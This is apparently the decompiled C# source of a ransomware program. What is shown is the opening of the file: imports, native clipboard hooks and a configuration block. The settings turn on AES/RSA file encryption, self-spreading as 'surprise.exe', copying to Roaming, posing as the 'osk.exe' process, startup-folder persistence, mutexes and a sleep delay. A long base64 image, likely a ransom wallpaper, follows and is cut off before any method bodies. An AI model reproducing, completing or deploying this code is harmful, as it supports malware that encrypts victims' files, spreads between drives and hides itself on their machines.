using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "osk.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 5;

	private static string base64Image = "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